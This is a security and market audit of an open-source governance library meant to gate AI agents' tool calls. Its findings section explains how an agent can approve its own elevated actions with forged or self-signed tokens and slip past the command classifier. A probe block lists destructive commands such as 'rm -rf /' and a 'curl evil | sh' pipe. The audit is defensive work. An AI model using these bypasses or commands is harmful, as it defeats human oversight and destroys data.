# WORLD-CLASS SOFTWARE AUDIT & MARKET POSITION — NOVEMBER 2026
## Autonomous Governance Laws (AGL) · `kirklasalle/AutonomousGovernanceLaws`

| Field | Value |
|---|---|
| **Audit date** | 2026-11-01 |
| **Commissioned by** | Kirk LaSalle (Founder & Supreme Operator) |
| **Audited revision** | `1a0f616e283291d2eb3c26fbec63cb73d6aa8130` (`main`) |
| **Package** | `autonomous-governance-laws` 0.1.0 (not published to PyPI) · charter v3.2.1 · Apache-2.0 |
| **Scope** | Full codebase (6 modules, 1,724 LOC), 4 test files (614 LOC), CI, all 20+ documents, and the prior audit suite ([`AUDIT_REPORT.md`](AUDIT_REPORT.md), [`CRITICAL_AUDIT.md`](CRITICAL_AUDIT.md), [`EXECUTIVE_SUMMARY.md`](EXECUTIVE_SUMMARY.md), [`MARKET_AUDIT.md`](MARKET_AUDIT.md)) |
| **Method** | Empirical: tests + coverage + adversarial probe scripts + line-level code review; external claims verified against primary sources via the project-local MCP fleet (`.mcp/`) |
| **Supersedes** | All health scores and market figures in documents dated before 2026-11-01 |
| **Companion** | [`INSTALLATION_METHODS_REPORT.md`](INSTALLATION_METHODS_REPORT.md): charter-copy vs. plugin installation analysis (adds P18, P19) |

> [!IMPORTANT]
> **Bottom line.** AGL is a well-conceived, cleanly structured **pre-alpha** library with genuinely differentiated ideas (SHA-256-pinned constitutional charter, payload-bound single-use Ed25519 operator approvals, zero-dependency local-first design). It is **not production-ready**: in its **default configuration** an agent can self-approve any elevated action (P1/P2), the tamper-evident ledger breaks across restarts and under concurrency (P4/P5/P17), and the risk classifier is trivially evaded (P6). Several documents overstate maturity ("Production Alpha", "Merkle ledger", "Security 99/100", "certified for production"). The composite engineering score under a reproducible rubric is **39 / 100**; completing the P0/P1 remediation plan in §8 projects to **≈70 / 100**.

---

## 1. EXECUTIVE SCORECARD

Scores are 0–10 per dimension against a world-class reference (e.g. a security-critical OSS library with OpenSSF Scorecard ≥ 7, ≥ 85% branch coverage, threat-model-driven tests and signed releases).

| # | Dimension | Weight | Score | Evidence (this audit) |
|---|---|---:|---:|---|
| 1 | Architecture & modularity | 10% | **6** | Clean kernel / security / linter / badge / CLI split, typed, zero runtime deps. Policy is hard-coded `frozenset`s, not policy-as-code; paths are CWD-relative (P9). |
| 2 | Security correctness | 25% | **3** | Default-config token bypass (P1, P2), DPAPI fail-open (P15), classifier evasion (P6). Ed25519 core is correct (P11). |
| 3 | Audit-trail integrity | 15% | **3** | Linear SHA-256 chain works within one process, but resets on every boot (P4), corrupts under threads (P5), cannot detect tail truncation (P17), and does not bind payloads or approvals (P16). |
| 4 | Testing & QA | 15% | **4** | 22/22 pass; **52%** line coverage (CLI 0%); one test codifies the P1 bypass; no concurrency, restart, evasion, or property tests. |
| 5 | Static analysis (`laws-lint`) | 5% | **3** | Self-reports 100/100 but skips `kernel.py`, `linter.py`, and `tests/` (P13); law labels diverge from canon (P14). |
| 6 | DevEx, CI & packaging | 10% | **5** | GitHub Actions CI, `pyproject.toml`, CLI entry points. Not on PyPI; no signed releases, SBOM, Scorecard, or type-check/lint gates. The wheel ships no charter and the repository is not an agent plugin (P19, found during the install analysis; already reflected in this score). |
| 7 | Documentation accuracy | 10% | **3** | Extensive and well-written, but 25 Merkle mentions, stale versions, three conflicting health scores (44 / 71 / 93.4), and multiple FALSE capability claims (§5). |
| 8 | Performance | 5% | **7** | 0.49 ms per SAFE call, 0.71 ms per signed ELEVATED call (P12); synchronous `open()` per event; no fsync policy. |
| 9 | Standards alignment | 5% | **4** | Ed25519 per RFC 8032 / FIPS 186-5; no OWASP ASI mapping, no Art. 12 evidence export; regulatory dates outdated. |
| | **Composite (weighted)** | **100%** | **39 / 100** | **Prototype / pre-alpha — not production-ready** |
| | Projected after §8 P0 + P1 | | **≈ 70 / 100** | Credible public beta |

**Reconciling the prior scores.** [`EXECUTIVE_SUMMARY.md`](EXECUTIVE_SUMMARY.md) v2.0.0 reported **93.4**, [`index.html`](index.html) and [`presentation.html`](presentation.html) report **71**, and [`CRITICAL_AUDIT.md`](CRITICAL_AUDIT.md) reported **44**. None of these had a reproducible rubric. The 93.4 figure is withdrawn. The 44 (pre-code, August 2026) is directionally consistent with this audit once shipped code and newly found defects are both accounted for.

---

## 2. METHODOLOGY & REPRODUCIBILITY

### 2.1 Environment
- Windows 11, Python 3.14 (`G:\Program Files\Python314\python.exe`; it carries `cryptography`, `pytest`, `mcp`). The system Python 3.15 lacks the dev dependencies.
- Revision `1a0f616`; working tree clean except a pre-existing date bump in `.nexus_briefing.md`.

### 2.2 Commands executed

```powershell
$py = 'G:\Program Files\Python314\python.exe'
& $py scripts\verify_charter.py                    # PASS (3/3 digests)
& $py -m pytest -q -p no:cacheprovider              # 22 passed
& $py -m pytest --cov=autonomous_governance tests   # 52% total
& $py -m autonomous_governance.cli verify           # PASS
laws-lint .                                          # 100/100, 0 findings (see P13)
```

### 2.3 Adversarial probes
A throw-away probe harness (not committed) booted `GovernanceKernel` in isolated temp directories with copies of the pinned charter and exercised:
- forged and self-signed tokens;
- replay after restart;
- two-boot ledger audits;
- 8-thread concurrent writes;
- a battery of classifier evasion strings;
- ledger tail truncation;
- the RFC 8032 Test 1 vector;
- a repeated-call latency benchmark.

Findings marked *probe* in §4 were observed directly. The P6 evasion set and P16/P17 were re-run independently while this report was being written.

### 2.4 Project-local MCP fleet (`.mcp/`)
| Server | Use in this audit | Outcome |
|---|---|---|
| **ids** (Intelligence Discovery) | `ai_document_analysis`, `knowledge_graph_query`, `ids_trace_lineage` over a dot-free snapshot of the 40 tracked files | Catalogued 29 indexable files / 302 KB; documentation quality 75/100; docstrings in 11/11 Python modules; `kernel.py` → 24 related nodes, `security.py` → 34 |
| **web-search** | `bulk_url_fetch` / `fetch_webpage` for citation verification | 55 URLs checked: **51 HTTP 200** with on-topic titles; 3 × HTTP 403 (ISO, Gartner, MarketsandMarkets); 1 × HTTP 404 (wrong MCP spec URL, corrected) |
| **loc** (Library of Congress) | US federal legislation search | Executed; used as context only |
| **goliath** (orchestrator) | `goliath_synergize_memory`, `goliath_get_swarm_state` | Long-term memory: 4 audit findings with SHA-256 "digital DNA"; short-term memory: 6 active-context tags (see Appendix C) |
| **ipa** | Multi-engine search | Not usable (defect, Appendix C) |

---

## 3. CODEBASE CATALOGUE (revision `1a0f616`)

| Module | LOC | Coverage | SHA-256 (prefix) | Role |
|---|---:|---:|---|---|
| [`kernel.py`](src/autonomous_governance/kernel.py) | 475 | 87% | `a9960190b42b6187` | Charter verification, 3-tier classifier, interceptor, ledger |
| [`security.py`](src/autonomous_governance/security.py) | 451 | 60% | `7f6dd55fae264312` | Ed25519 (pure-Python + `cryptography`), DPAPI keystore, AGL-V1 tokens |
| [`cli.py`](src/autonomous_governance/cli.py) | 310 | **0%** | `b4bed06aabd7049b` | `agy-governance` CLI |
| [`badge.py`](src/autonomous_governance/badge.py) | 226 | 69% | `080f11b67b3fda90` | Compliance badge (SVG / JSON / Markdown) |
| [`linter.py`](src/autonomous_governance/linter.py) | 202 | 55% | `d03a611a21bdc8b9` | `laws-lint` static scanner |
| [`__init__.py`](src/autonomous_governance/__init__.py) | 60 | — | `e5f876c392547e02` | Public API |
| `tests/` (4 files, 22 tests) | 614 | — | — | Kernel 8 (incl. repo-charter check), security 5, linter 6, badge 3 |

Charter: [`config/charter_manifest.json`](config/charter_manifest.json) pins [`Permanent_Active_Directives.txt`](Permanent_Active_Directives.txt), [`AGENTIC_PRIME_DIRECTIVE.md`](AGENTIC_PRIME_DIRECTIVE.md), and [`AGENTIC_SACRED_COVENANT.md`](AGENTIC_SACRED_COVENANT.md) with LF-normalised SHA-256. Verified intact; **these files were not modified by this audit.**

---

## 4. FINDINGS

Severity follows CVSS-style impact × exploitability in AGL's stated threat model ("an autonomous agent must not be able to clear its own gates"). Line numbers refer to revision `1a0f616`.

### 4.1 Critical

| ID | Finding | Location | Evidence | Remediation |
|---|---|---|---|---|
| **P1** | **Legacy token bypass.** With no pinned operator key (the default, `require_attestation=False`), any dict of the form `{"action_id": <new>, "signature": <anything>}` is accepted as operator approval for any ELEVATED action. | [`security.py`](src/autonomous_governance/security.py) 392-397; default at [`kernel.py`](src/autonomous_governance/kernel.py) 103 | *Probe*: `write_file` and `execute_terminal` executed with `"signature": "anything"`. [`test_risk001_elevated_approval_required`](tests/test_kernel.py) (line 127) **asserts this behaviour as correct**. | Delete the legacy path. Refuse every ELEVATED action unless an operator key is pinned. Make `require_attestation=True` the default. Rewrite the test to use a real AGL-V1 token. |
| **P2** | **Self-signed token acceptance.** With no pinned key, `verify_approval_token` trusts the `operator_pubkey` *embedded in the token*, so an agent can mint its own keypair and approve itself. This violates LAW10 ("non-self-clearing gates"). | [`security.py`](src/autonomous_governance/security.py) 423-430 | *Probe*: an agent-generated keypair signed a valid AGL-V1 token, which was accepted. | Never trust key material carried in the token. Fail closed when `expected_operator_pubkey is None`. |

### 4.2 High

| ID | Finding | Location | Evidence | Remediation |
|---|---|---|---|---|
| **P4** | **Ledger chain resets on every boot.** `prev_event_hash` is initialised to 64 zeros instead of the last ledger hash, so the second process to write to a ledger breaks the chain. | [`kernel.py`](src/autonomous_governance/kernel.py) 111 | *Probe*: boot → 3 events → boot → 3 events → `audit_ledger()` reports `valid: False`. | In `_init_ledger`, read the final line's `event_hash` and verify the full chain at boot. |
| **P5** | **Ledger is not thread- or process-safe.** No lock around hash computation and append. | [`kernel.py`](src/autonomous_governance/kernel.py) 371-400 | *Probe*: 8 threads × 100 calls → 786 of 801 events written, **609 broken links**. | Add a `threading.Lock` plus an OS file lock (`msvcrt.locking` / `fcntl.flock`), with optional `fsync`. |
| **P6** | **Classifier is substring-based and default-allow.** Only `payload["command"]` and `payload["target_path"]` are inspected; unknown tools are classified SAFE. Combined with P1, every evasion that lands in ELEVATED is executable with a fake token. | [`kernel.py`](src/autonomous_governance/kernel.py) 186-217 | *Probe*: six evasion variants were classified ELEVATED instead of PROHIBITED, one remote-script pipe was classified SAFE, and one benign read was a false positive (exact strings in the block below this table). | Default-deny or default-ELEVATED for unknown tools. Normalise with `shlex` and match on tokens. Inspect all string values. Canonicalise paths (`Path.resolve`). Externalise policy (OPA/Cedar/YAML). |
| **P15** | **Key storage fails open.** If DPAPI decryption fails, `load_key` silently returns the raw file bytes. The non-Windows path writes keys unencrypted, and `chmod 0600` failures are swallowed. | [`security.py`](src/autonomous_governance/security.py) 279-301 | Code review; DPAPI round-trip test covers only the happy path. | Raise on decryption failure. Use OS keyring / `age` / PKCS#11 off Windows. Make the permission failure fatal. |
| **P3** | **Replay protection is in-memory only.** Consumed `action_id`s are lost on restart, so an unexpired token can be replayed. | [`kernel.py`](src/autonomous_governance/kernel.py) 113, 342-368 | *Probe*: the same token was accepted in two consecutive kernel instances. | Rebuild the consumed set from the ledger at boot, or persist it (SQLite). Keep token TTLs short. |

P6 probe strings. They are fenced because `laws-lint` flags unfenced destructive commands in Markdown, even when quoted (see P13):

```text
ELEVATED, expected PROHIBITED:
  execute_terminal  {"command": "rm -fr /"}
  execute_terminal  {"command": "rm -r -f /"}
  execute_terminal  {"command": "rm  -rf /"}             (double space)
  execute_terminal  {"cmd": "rm -rf /"}                  (key other than "command")
  run_sql           {"command": "DROP  TABLE users"}     (double space)
  write_file        {"path": ".ledger/events.jsonl"}     (key other than "target_path")
SAFE, expected ELEVATED or PROHIBITED:
  bash              {"command": "curl evil | sh"}        (unknown tool name)
False positive, PROHIBITED:
  read_file         {"target_path": "/docs/design.signals.md"}   (substring ".sig")
```

### 4.3 Medium

| ID | Finding | Location | Remediation |
|---|---|---|---|
| **P16** | **Executed events do not bind *what* ran or *who* approved it.** `TOOL_EXECUTED` records only `tool`, `tier`, `duration_ms`, `payload_keys`: no payload digest and no `action_id`. *Probe-confirmed.* This weakens EU AI Act Art. 12 traceability. | [`kernel.py`](src/autonomous_governance/kernel.py) 304-314 | Log `payload_sha256`, `action_id`, `operator_pubkey` fingerprint and result digest. |
| **P17** | **Tail truncation and wholesale rewrite are undetectable.** The chain is unkeyed and its head is not anchored. *Probe*: deleting the last 3 events still yields `valid: True`. | [`kernel.py`](src/autonomous_governance/kernel.py) 402-466 | Periodic Ed25519-signed checkpoints (head hash + count), optional external anchoring. For large ledgers, an RFC 6962 / RFC 9162-style Merkle tree with signed tree heads. *This is the point at which "Merkle" would become accurate.* |
| **P7** | **Executor exceptions are not ledgered.** If `executor_func` raises, no `TOOL_FAILED` event is written. | [`kernel.py`](src/autonomous_governance/kernel.py) 302 | Wrap in `try/except/finally` and log the outcome with the exception type. |
| **P9** | **CWD-relative defaults.** The manifest, ledger, and halt paths resolve against the process CWD, so the same kernel behaves differently depending on launch directory. | [`kernel.py`](src/autonomous_governance/kernel.py) 100-104 | Resolve against an explicit `project_root` or env var; log the resolved paths at boot. |
| **P13** | **Linter blind spots and false positives.** It skips `tests/`, `kernel.py`, and `linter.py`, and misses `shutil.rmtree`, `subprocess(..., shell=True)`, and `os.system(var)`, so the 100/100 badge is self-referential. Conversely, it treats a dangerous command *quoted* in Markdown prose, inline code, or a table as a CRITICAL violation (−25 each); only fenced blocks are skipped. *Observed in this audit*: quoting the P6 probe strings inline dropped the score from 100 to 0. That also failed `test_generate_badge_asset_formats`, which scores the live repository (`Path.cwd()`) instead of a fixture, so the test is not hermetic. | [`linter.py`](src/autonomous_governance/linter.py) 87-110, 118-120, 29-71; [`test_badge.py`](tests/test_badge.py) 38-47 | Remove the self-exemptions (use inline suppressions with justification). Use AST-based rules for code; skip inline code spans in docs or score docs separately. Point the badge test at a fixture repository. Add Bandit/Semgrep to CI. |
| **P14** | **Linter law labels diverge from the canonical charter.** For example, linter "Law 4: Open Standards" vs. charter Law 4 on other systems violating Laws 1–3; linter "Law 8: Empirical Grounding" vs. charter Law 8 on equity. Reports therefore cite the wrong law. | [`linter.py`](src/autonomous_governance/linter.py) 16-27 | Generate labels from [`Permanent_Active_Directives.txt`](Permanent_Active_Directives.txt) or a single constants module. |
| **P10** | **SVG injection.** Badge `label` and `message` are interpolated into SVG without XML escaping. | [`badge.py`](src/autonomous_governance/badge.py) 180-183 | `xml.sax.saxutils.escape`. |
| **P18** | **Charter paths ignore the manifest location.** Charter file names from the manifest resolve against the process CWD (`Path(file_name)`), even when `manifest_path` is absolute. A correctly installed project therefore fails to boot from a sub-directory. *Probe S11.* | [`kernel.py`](src/autonomous_governance/kernel.py) 162-166 | Resolve relative to the manifest's project root or an explicit `project_root`. See [INSTALLATION_METHODS_REPORT.md](INSTALLATION_METHODS_REPORT.md) §7. |
| **P19** | **Distribution gap.** The wheel and sdist ship no charter files and no manifest, so `pip install` alone can never boot the kernel (*probe S0*). There is also no `init` command, the package is not on PyPI (404), and the repository is not an agent plugin (`copilot plugin install` → "No plugin.json found"). | [`pyproject.toml`](pyproject.toml) build targets | Package the charter as data (`importlib.resources`); add `agy-governance init`; add a plugin manifest. See [INSTALLATION_METHODS_REPORT.md](INSTALLATION_METHODS_REPORT.md) §6.2. |

### 4.4 Low / informational

| ID | Finding | Location |
|---|---|---|
| **P8** | The docstring says `GovernanceViolation` "cannot be caught and suppressed by agent code". It is an ordinary `Exception` subclass and can be caught. In-process enforcement cannot prevent this; document the trust boundary instead. | [`kernel.py`](src/autonomous_governance/kernel.py) 37 |
| **P11** ✅ | Ed25519 implementation passes RFC 8032 Test 1; measured sign time ≈ 5.5 ms. | [`security.py`](src/autonomous_governance/security.py) |
| **P12** ✅ | Mean interception overhead 0.49 ms (SAFE) / 0.71 ms (signed ELEVATED). This meets PRD NFR-01 (≤ 2.5 ms). PRD NFR-02 (10k events/s async) is not implemented: writes are synchronous. | [`kernel.py`](src/autonomous_governance/kernel.py) |
| — | `.halt` is checked **before each intercepted call**. It does not terminate in-flight executors or "worker threads", contrary to the [`USER_GUIDE.md`](USER_GUIDE.md) §4 diagram. | [`kernel.py`](src/autonomous_governance/kernel.py) 260-270 |
| — | Not implemented anywhere, despite appearing in some documents: Merkle tree, M-of-N quorum, CAC delegation tokens, HSM/PKCS#11, ML-DSA/Dilithium, SHA-3, signed manifest, framework adapters. | repo-wide |

### 4.5 Genuine strengths (keep)
- **Charter pinning works**: LF-normalised SHA-256 digests, verified at boot and in CI. This is rare in the market (see §6.3).
- **Payload-bound, expiring, single-use approval tokens** (AGL-V1) are the right design and are correctly implemented *when a key is pinned*.
- **Zero runtime dependencies**, ~1.7k LOC, readable and typed, sub-millisecond overhead.
- **Honest gap-disclosure tables** already exist in [`GOVERNANCE.md`](GOVERNANCE.md) and [`PRD.md`](PRD.md) §5, a good foundation for evidence-based compliance claims.
- Apache-2.0, `SECURITY.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, and CI are all present.

---

## 5. DOCUMENTATION ACCURACY AUDIT

Every capability claim in the repository was checked against code and probe results. The most material corrections are below. The full line-level register was retained by the auditor.

| Claim (location) | Verdict | Ground truth | Action taken (2026-11-01) |
|---|---|---|---|
| "SHA-256 **Merkle** chained ledger" (README badge & diagram, EXECUTIVE_SUMMARY, AUDIT_REPORT, PRD, DEVELOPER_GUIDE, CHANGELOG, presentation, `.nexus_briefing`) | **FALSE** | Linear SHA-256 hash chain (P4, P17) | Corrected in current-state docs; historical entries annotated |
| "Production Alpha", "operational standard" (EXECUTIVE_SUMMARY :14-18) | **OVERSTATED** | 0.1.0, unpublished, P1/P2 critical | Re-stated as *pre-alpha* |
| Security 99/100, composite 93.4 (EXECUTIVE_SUMMARY) | **OVERSTATED** | 39/100 (§1) | Superseded |
| "Replay-protected", "permanently consumed" tokens (README :41, USER_GUIDE :151-160) | **OVERSTATED** | In-memory only (P3); default bypass (P1/P2) | Corrected |
| Ledger integrity durable across operation (USER_GUIDE §5) | **FALSE** | Chain resets per boot (P4) | Warning added |
| Halt "terminates worker threads < 50 ms" (USER_GUIDE §4) | **OVERSTATED** | Next-call refusal only | Clarified |
| CAC swarm tokens / child-depth enforcement (DEVELOPER_GUIDE §3) | **FALSE (not implemented)** | No code | Marked *planned* |
| "Certified for Production" (DEVELOPER_GUIDE :382) | **FALSE** | — | Removed |
| Quantum-resistant identity preparedness (PRD NFR-05) | **NOT IMPLEMENTED** | No algorithm-agility abstraction yet | Marked *target* |
| "Supreme Operator re-signs manifest" (GOVERNANCE :62) | **FALSE** | Manifest is unsigned digests | Corrected to "re-pins" |
| 7/7 adversarial stress tests passed (AUDIT_REPORT :143-240) | **FALSE** | No such test suite exists | Superseded-by banner |
| "100% resolved" (CRITICAL_AUDIT :15-27) | **FALSE** | P1–P19 open | Re-audit addendum |
| "90% EU AI Act / 100% NIST AASI alignment" (EXECUTIVE_SUMMARY, MARKET_AUDIT, `.nexus_briefing`) | **UNSUPPORTED** | No article-level evidence; "AASI" is not NIST nomenclature | Withdrawn |
| "EU AI Act full application 2 Aug 2026" for high-risk | **OUTDATED** | AI Omnibus: Annex III 2 Dec 2027; Annex I 2 Aug 2028 | Corrected |
| "Art. 62 incident reporting" (MARKET_AUDIT) | **WRONG ARTICLE** | Art. 73 (Art. 62 = SME measures) | Corrected |
| "OWASP Top 17" (MARKET_AUDIT) | **UNVERIFIED** | OWASP Top 10 for Agentic Applications 2026 (ASI01–ASI10) | Replaced |
| `laws-lint` 100/100 (README :42-43) | **SELF-REFERENTIAL** | P13/P14 | Qualified |
| Site/deck version v3.2.0 / v3.1.0, "no tests/CI", 71/100 (index.html, presentation.html) | **STALE** | 0.1.0 SDK + charter v3.2.1, 22 tests + CI | Updated |
| [`AGENTIC_PRIME_DIRECTIVE.md`](AGENTIC_PRIME_DIRECTIVE.md) footer v3.1.0; [`AGENTIC_SACRED_COVENANT.md`](AGENTIC_SACRED_COVENANT.md) date | **STALE** | Manifest v3.2.1 | **Not edited.** These files are SHA-256-pinned; changes require the Amendment Protocol and re-pinning. |

---

## 6. MARKET POSITION & COMPETITIVE COMPARISON (November 2026)

### 6.1 Market size: what is verifiable

| Source | Scope | Figure | Verification |
|---|---|---|---|
| Gartner (17 Feb 2026) [M1] | AI governance **platforms** spend | **$492M (2026) → > $1B by 2030** | Primary page 403 to automation; corroborated by multiple secondary reports |
| Grand View Research [M2] | AI governance market | $308.3M (2025) → **$417.8M (2026)**, 36.0% CAGR → $3.59B (2033) | ✅ MCP fetch; figures in page body |
| Precedence Research [M3] | AI governance market | **$419.45M (2026)**, 34.27% CAGR → $5.88B (2035) | ✅ MCP fetch |
| MarketsandMarkets [M4] | AI governance (broad) | $0.89B (2024) → $5.78B (2029), 45.3% CAGR | Primary page 403; secondary corroboration |

**Interpretation.** The defensible headline is **"≈ $0.4–0.5B in 2026, growing 34–45% a year"**, with an explicit scope caveat. The previous "$500M / 45% CAGR" merged the high end of two different definitions. The "88% of enterprises breached" and "Gartner 40% decommission" statistics had no traceable source and have been withdrawn.

### 6.2 Regulatory & standards update

| Item | Status as of 2026-11-01 | Source |
|---|---|---|
| **EU AI Act + AI Omnibus** | Omnibus in force **27 Jul 2026**. Art. 50 transparency applied 2 Aug 2026. **Annex III high-risk → 2 Dec 2027**; **Annex I (product-embedded) → 2 Aug 2028** | [R1][R2][R3] ✅ |
| EU AI Act Art. 12 / 14 / 15 / 73 | Record-keeping / human oversight / robustness & cybersecurity / **serious-incident reporting (Art. 73)** | [R4] ✅ |
| NIST AI RMF 1.0; AI 600-1 | Voluntary; GenAI profile (Jul 2024) | [R5][R6] ✅ |
| NIST **AI Agent Standards Initiative** (CAISI) | Launched 17 Feb 2026. An initiative, **not** a conformance standard; "AASI" is informal shorthand | [R7] ✅ |
| **OWASP Top 10 for Agentic Applications 2026** | ASI01–ASI10, published 9 Dec 2025, v2.01 on 1 Jun 2026 | [R8] ✅ |
| OWASP Agentic AI Threats & Mitigations | T1–T15 taxonomy | [R9] ✅ |
| ISO/IEC 42001:2023 | AI management-system standard | [R10] (403 to automation; well established) |
| Colorado | SB 24-205 replaced by SB 26-189; effective 1 Jan 2027 (re-verify statute before relying on it) | [R11] ✅ secondary |
| California SB 53 | Signed 29 Sep 2025; effective 1 Jan 2026 (frontier developers) | [R12] ✅ |
| Singapore IMDA | Model AI Governance Framework for **Agentic AI**, 22 Jan 2026 (updated May 2026) | [R13] ✅ |
| **MCP specification** | **2026-07-28** is current (stateless requests, per-request capabilities); 2025-11-25 is the prior version | [R14][R15] ✅ |
| FIPS 204 (ML-DSA) / FIPS 186-5 (EdDSA) / RFC 8032 | Final; AGL uses Ed25519 (classical, not post-quantum) | [R16][R17][R18] ✅ |

**Implication.** The EU high-risk deadline moved out by about 16 months. That gives AGL a realistic window to become credible evidence tooling (Art. 12 logging, Art. 14 oversight) **before** buyers need it. It also removes the urgency narrative of "enforced Aug 2026" used in earlier documents.

### 6.3 Competitive landscape

Legend: ✅ native · ◐ partial / conditional · ❌ absent. Competitor capabilities are taken from vendor documentation and are not independently tested.

| Offering | Model | Pre-exec tool-call intercept | Signed single-use human approval | Tamper-evident log | Kill switch | Policy-as-code | Regulatory mapping | Agent identity | Distribution |
|---|---|:-:|:-:|:-:|:-:|:-:|:-:|:-:|---|
| **AGL 0.1.0** (this repo) | OSS, Apache-2.0 | ◐ (evadable, P6) | ◐ (**bypassable by default**, P1/P2) | ◐ (hash chain; P4/P5/P17) | ◐ (`.halt`, next-call) | ❌ (hard-coded) | ❌ (narrative only) | ❌ | GitHub source only |
| **Microsoft Agent Governance Toolkit** [C4] | OSS, MIT, Public Preview | ✅ | ◐ | ✅ (tamper-evident decision records) | ◐ | ✅ | ◐ (self-reported OWASP ASI 7 full / 3 partial) | ✅ | PyPI / npm / NuGet |
| Microsoft Agent 365 + Entra Agent ID [C7] | Commercial, GA May 2026 | ✅ | ◐ (Conditional Access) | ✅ | ◐ | ✅ | ◐ | ✅ | SaaS |
| AWS Bedrock AgentCore Policy (Cedar) [C8] | Commercial (Cedar OSS) | ✅ | ◐ | ✅ | ◐ | ✅ Cedar | ◐ | ✅ | Cloud |
| Google Model Armor / Agent Engine [C9] | Commercial | ✅ | ◐ | ✅ | ◐ | ✅ | ◐ | ✅ (SPIFFE) | Cloud |
| NVIDIA NeMo Guardrails [C1] | OSS, Apache-2.0 | ✅ | ◐ (custom hook) | ◐ (OTel) | ❌ | ✅ Colang | ❌ | ❌ | PyPI |
| Docker MCP Gateway [C3] | OSS | ✅ (MCP) | ◐ | ✅ | ◐ | ✅ | ❌ | ◐ | Docker |
| OPA / Cedar [C2][C5] | OSS policy engines | ✅ (as backend) | ❌ | ❌ | ❌ | ✅ | ❌ | ❌ | Binaries / crates |
| Zenity ($125M Series C, Aug 2026) [C10] | Commercial | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ◐ | SaaS |
| Credo AI · Holistic AI · IBM watsonx.gov · OneTrust · ServiceNow | Commercial GRC | ◐ | ◐ | ✅ | ❌ | ◐ | ✅ | ◐ | SaaS |

**Consolidation signal (2025–26).**
- Protect AI → Palo Alto (~$700M)
- Lakera → Check Point (~$300M)
- CalypsoAI → F5 (~$180M)
- Invariant Labs → Snyk
- Galileo → Cisco
- Guardrails AI → Harvey (Sep 2026)
- Straiker $64M Series A

Standalone guardrail start-ups are being absorbed into security platforms, and hyperscalers now bundle tool-call interception for free. [C11–C17]

### 6.4 Where AGL stands (honest position)

**Position: niche, pre-alpha, open-source "constitutional kernel."** AGL is not a GRC suite and not a cloud agent platform. Its closest peers are Microsoft's Agent Governance Toolkit, NeMo Guardrails, Docker MCP Gateway, and OPA/Cedar used as agent policy backends.

| Axis | AGL vs. market |
|---|---|
| **Unique today** | (1) Content-addressed, SHA-256-pinned **constitutional charter** verified at boot. No surveyed vendor names this as a feature. (2) **Payload-bound, expiring, single-use Ed25519 approval tokens** as an inspectable artifact; most competitors implement approval as a workflow click or webhook. (3) **Zero-dependency, offline, single-library** footprint suited to air-gapped and self-hosted teams. |
| **At parity (once fixed)** | Pre-execution interception, hash-chained logging, halt switch. These are table stakes in 2026. |
| **Behind** | Security correctness (P1/P2/P6), distribution (no PyPI), policy-as-code, agent identity, regulatory mapping, observability/OTel export, framework adapters, ecosystem/maintainers (bus factor 1), post-quantum agility. |
| **OWASP ASI coverage (self-assessed)** | **0 full · 7 partial · 3 none.** ASI02 / 03 / 04 / 05 / 08 / 09 / 10 are partial; ASI01 / 06 / 07 are not addressed. For comparison, Microsoft AGT self-reports 7 full / 3 partial. |

**Changes vs. MARKET_AUDIT v1.0.0 (Aug 2026).**
- The claims "only runtime-enforced constitutional framework" and "first mover" are **withdrawn**.
- The claims "Merkle proof" and "post-quantum preparedness" are **withdrawn**.
- Market size is **re-based** to cited figures.
- The EU timeline is **moved** to Dec 2027 / Aug 2028.
- AGL's competitive standing improved on *existence* (it now ships code, CLI, tests, and CI) but declined on *relative* terms, because Microsoft open-sourced a broader toolkit and the space consolidated.

**Recommended positioning.** Market AGL as **"the minimal, auditable constitutional kernel and evidence generator for agent tool calls."**
- Make it embeddable *inside* MCP gateways and agent frameworks rather than competing with them.
- Lead with what is genuinely different: charter pinning and cryptographically non-self-clearing approvals.
- Pair each claim with a mapped control (OWASP ASI02/05/09/10; EU AI Act Art. 12/14 evidence export).

### 6.5 SWOT (updated)

| Strengths | Weaknesses |
|---|---|
| Charter pinning; payload-bound single-use signed approvals; zero deps; sub-ms overhead; Apache-2.0; candid gap tables | P1/P2 self-approval bypass; ledger defects; evadable classifier; 52% coverage; not on PyPI; bus factor 1; doc over-claims |
| **Opportunities** | **Threats** |
| EU high-risk deadline moved to Dec 2027 (time to mature); OWASP ASI is becoming a procurement checklist; MCP 2026-07-28 stateless model favours per-request policy middleware; air-gapped/sovereign deployments | Free bundled controls from Microsoft/AWS/Google; MS AGT (MIT, multi-language) occupies the same OSS niche; vendor consolidation; credibility risk if over-claims persist |

---

## 7. STANDARDS MAPPING (evidence-based, not certification)

AGL is a *component*. It cannot make a system compliant, but it can produce evidence for specific controls.

| Control | What AGL provides today | Gap to close |
|---|---|---|
| EU AI Act **Art. 12** Record-keeping | Hash-chained JSONL events with UTC timestamps | P4, P5, P16, P17; retention policy; export format |
| EU AI Act **Art. 14** Human oversight | Signed approvals for ELEVATED actions; `.halt` | P1, P2, P3; approval preview UX; in-flight interruption |
| EU AI Act **Art. 15** Robustness & cybersecurity | Charter integrity at boot | P6, P15; fuzzing; SAST in CI |
| EU AI Act **Art. 73** Serious incidents | — | Incident export from ledger |
| NIST AI RMF *Govern / Manage* | Charter, council process, halt | Measured KPIs, risk register tied to code |
| OWASP **ASI02** Tool misuse | 3-tier gate | P6, policy-as-code |
| OWASP **ASI05** Unexpected code execution | Prohibited-command list | Sandbox integration; token-level matching |
| OWASP **ASI09** Human-agent trust exploitation | Payload-bound approvals: what is signed is what runs | Human-readable action preview |
| OWASP **ASI10** Rogue agents | Halt + ledger | P4/P5/P17; anomaly signals |

---

## 8. PRIORITISED REMEDIATION ROADMAP

| Phase | Window | Items | Exit criterion |
|---|---|---|---|
| **P0: Security correctness** | 2 weeks | P1, P2 (fail closed without pinned key; delete legacy path; fix `test_risk001`); P6 (default-deny unknown tools, `shlex` tokenisation, all-values scan, path canonicalisation, host tool-name mapping); P4 + P5 (chain resume + locking); P15 (fail-closed key load); P18 + P19 (manifest-relative charter paths; charter shipped as package data) | Probe suite converted into regression tests and green; no ELEVATED action possible without operator key; `pip install` alone boots |
| **P1: Evidence-grade ledger & QA** | +4 weeks | P3 (persistent replay set); P7, P16 (bind payload + approval); P17 (signed checkpoints); P9, P10, P13, P14; CLI tests; coverage gate ≥ 85%; Bandit/Semgrep + mypy/ruff in CI; `agy-governance init`; agent-plugin package (hooks + skill) with live E2E tests ([INSTALLATION_METHODS_REPORT.md](INSTALLATION_METHODS_REPORT.md) I5–I7) | Composite ≥ 70; OpenSSF Scorecard ≥ 7 |
